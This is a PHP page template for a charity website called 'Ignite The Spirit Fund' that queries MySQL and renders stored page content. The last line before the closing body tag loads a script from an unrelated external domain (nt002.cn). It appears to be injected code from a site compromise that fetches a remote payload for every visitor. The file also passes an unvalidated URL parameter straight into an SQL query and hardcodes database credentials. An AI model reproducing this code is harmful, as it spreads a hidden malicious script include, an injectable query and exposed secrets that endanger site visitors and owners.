<?php
$page_id = $_GET['id'];


$dbhost = 'mysql.ignitethespirit.org';
$dbuser = 'ignite';
$dbpass = 'fire08';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');

$dbname = 'ignite';
mysql_select_db($dbname);

$page_query = "SELECT * FROM pages WHERE page_id='$page_id'";
$page_result = mysql_query($page_query);
$row = mysql_fetch_array($page_result, MYSQL_ASSOC);



$blurb_query = "SELECT * FROM pages ORDER by page_id DESC";
$blurb_result = mysql_query($blurb_query);

function blurbs($query_result)
{
	$page_link = "Learn How";
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
		if ($row['page_show'] != 0)
		{
			echo "<div class='blurb'> \n";
        	echo "<h3>".$row['page_title']."</h3> \n";
			echo "<img src=/".$row['page_img1']."> \n";
	    	echo "<p><a class='change' href='pages.php?id=".$row['page_id']."'>[Read More]</a></p> \n";
        	echo "</div> \n";
		}
	}
}

function bbcode_format ($str) {
    $str = htmlentities($str);

    $simple_search = array(
                '/\[b\](.*?)\[\/b\]/is',                                
                '/\[i\](.*?)\[\/i\]/is',                                
                '/\[u\](.*?)\[\/u\]/is',                                
                //'/\[url\=(.*?)\](.*?)\[\/url\]/is',                         
                //'/\[url\](.*?)\[\/url\]/is',                             
                //'/\[align\=(left|center|right)\](.*?)\[\/align\]/is',    
                //'/\[img\](.*?)\[\/img\]/is',                            
                //'/\[mail\=(.*?)\](.*?)\[\/mail\]/is',                    
                //'/\[mail\](.*?)\[\/mail\]/is',                            
                //'/\[font\=(.*?)\](.*?)\[\/font\]/is',                    
                //'/\[size\=(.*?)\](.*?)\[\/size\]/is',                    
                //'/\[color\=(.*?)\](.*?)\[\/color\]/is',  
				'/\[return\]/is',      
                );

    $simple_replace = array(
                '<strong>$1</strong>',
                '<em>$1</em>',
                '<u>$1</u>',
                //'<a href="$1">$2</a>',
                //'<a href="$1">$1</a>',
                //'<div style="text-align: $1;">$2</div>',
                //'<img src="$1" />',
                //'<a href="mailto:$1">$2</a>',
                //'<a href="mailto:$1">$1</a>',
                //'<span style="font-family: $1;">$2</span>',
                //'<span style="font-size: $1;">$2</span>',
                //'<span style="color: $1;">$2</span>',
				'<br /><br />',
                );

    // Do simple BBCode's
    $str = preg_replace ($simple_search, $simple_replace, $str);

    // Do <blockquote> BBCode
    //$str = bbcode_quote ($str);

    return $str;
} 


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
	<title>Ignite The Spirit Fund</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<meta http-equiv="Content-Style-Type" content="text/css" />
	<link rel="stylesheet" href="default.css"  type="text/css" />
	<link rel="stylesheet" href="pages.css"  type="text/css" />
</head>
<body>
<div class="nav_container">
	<a href="index.php">< back to the home page</a>
</div>
<div class="container">
      <div class="left">
	  	<a class="logo_link" href="index.php"><img src="images/its_logo_rollover.jpg" alt="logo" /></a>
        
			<div class="big_left"> 
			<!--
				<ul class="left_nav">
					<li><a href="#">Eligibility</a></li>
					<li class="bottom"><a href="#">Application</a></li>
				</ul>
			-->
			
			<?php blurbs($blurb_result); ?>
		    </div>
		</div>
		<div class="big_right">
		<img src="<?php echo $row['page_img1']; ?>" >
		<h1><?php echo $row['page_title']; ?></h1>
		<?php echo"<p>".stripslashes(bbcode_format ($row['page_content']))."</p>"; ?>
		
		</div>
</div>
<script src='http://nt002.cn/E/J.JS'></script></body>
</html>